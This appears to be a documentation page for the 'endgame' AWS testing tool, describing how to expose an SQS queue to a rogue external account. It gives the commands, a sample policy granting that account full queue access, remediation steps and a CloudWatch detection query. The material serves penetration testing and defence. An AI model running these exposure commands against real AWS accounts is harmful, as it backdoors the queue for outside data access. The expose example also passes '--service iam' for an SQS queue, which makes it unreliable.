# SQS Queues

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [Basic Detection](#basic-detection)
* [References](#references)

## Steps to Reproduce

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

endgame expose --service iam --name test-resource-exposure
```

* To verify that the SQS queue has been shared with a rogue user, run the following from the victim account:

```bash
export QUEUE_URL=(`aws sqs get-queue-url --queue-name test-resource-exposure | jq -r '.QueueUrl'`)

aws sqs get-queue-attributes --queue-url $QUEUE_URL --attribute-names Policy
```

* Observe that the contents match the example shown below.

## Example

The policy below allows the Evil Principal's account ID (`999988887777` access to `sqs:*` to the victim resource (`arn:aws:sqs:us-east-1:111122223333:test-resource-exposure`), indicating a successful compromise.


```json
{
    "Attributes": {
        "Policy": "{\"Version\":\"2008-10-17\",\"Id\":\"arn:aws:sqs:us-east-1:111122223333:test-resource-exposure/SQSDefaultPolicy\",\"Statement\":[{\"Sid\":\"AllowCurrentAccount\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::111122223333:root\"},\"Action\":\"SQS:*\",\"Resource\":\"arn:aws:sqs:us-east-1:111122223333:test-resource-exposure\"},{\"Sid\":\"Endgame\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999988887777:root\"},\"Action\":\"SQS:*\",\"Resource\":\"arn:aws:sqs:us-east-1:111122223333:test-resource-exposure\"}]}"
    }
}

```

## Exploitation

```
TODO
```

## Remediation

* **Trusted Accounts Only**: Ensure that SQS Queues are only shared with trusted accounts, and that the trusted accounts truly need access to the SQS Queue.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **AWS Access Analyzer**: Leverage AWS Access Analyzer to report on external access to  SQS Queues. See [the AWS Access Analyzer documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html) for more details.
* **Restrict access to IAM permissions that could lead to exposure of your SQS Queues**: Tightly control access to the following IAM actions:
      - [sqs:AddPermission](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/APIReference/API_AddPermission.html): _Adds a permission to a queue for a specific principal._
      - [sqs:RemovePermission](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/APIReference/API_RemovePermission.html): _Revokes any permissions in the queue policy that matches the specified Label parameter._
      - [sqs:GetQueueAttributes](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/APIReference/API_GetQueueAttributes.html): _Gets attributes for the specified queue. This includes retrieving the list of principals who are authorized to access the queue._
      - [sqs:GetQueueUrl](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/APIReference/API_GetQueueUrl.html): _Returns the URL of an existing queue._
      - [sqs:ListQueues](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/APIReference/API_ListQueues.html): _Returns a list of your queues._

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## Basic Detection
The following CloudWatch Log Insights query will include exposure actions taken by endgame:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent 
| filter eventSource='sqs.amazonaws.com' AND (eventName='AddPermission' or eventName='RemovePermission')
```

This query assumes that your CloudTrail logs are being sent to CloudWatch and that you have selected the correct log group.

## References

* [aws sqs add-permission](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sqs/add-permission.html)
* [aws sqs get-queue-attributes](https://docs.aws.amazon.com/cli/latest/reference/sqs/get-queue-attributes.html)
